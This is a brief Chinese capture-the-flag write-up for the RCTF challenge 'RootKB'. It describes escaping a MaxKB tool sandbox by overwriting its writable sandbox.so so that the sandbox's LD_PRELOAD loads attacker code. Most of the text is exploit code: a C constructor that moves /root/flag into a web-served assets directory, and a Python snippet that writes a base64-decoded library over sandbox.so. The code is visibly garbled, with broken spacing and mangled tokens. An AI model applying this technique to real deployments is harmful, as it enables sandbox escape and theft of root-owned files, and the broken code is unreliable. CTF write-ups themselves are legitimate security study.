---
tags: [沙箱逃逸, LD_PRELOAD, 动态链接库覆盖, Python]
---

# RootKB

ok了本地出了,sandbox下可写， [覆盖sandbox.so](http://xn--sandbox-m31rp95k.so/)， 靠它运行沙盒环境时添加的ld_preload触发就行了

exp.c

```
#include  <stdio .h>

一attribute一 ((constructor))  void  abc(void)  {
const  char  *src  =  "/root/flag " ;
const  char  *dst  =  "/opt/maxkb-app/apps/static/admin/assets/flag " ;
rename (src ,  dst) }
```

在tools那里写python代码执行写入即可

```
import  base64
import  os

def  fileWrite() :
with  open("/opt/maxkb-app/sandbox/sandbox .so " ,  "wb")  as  f :
f .write(base64 .b64decode("base64"))
os .popen("whoami")
return  "success "
```

RCTF{trust_no_tool___dont_be_a_root_fool}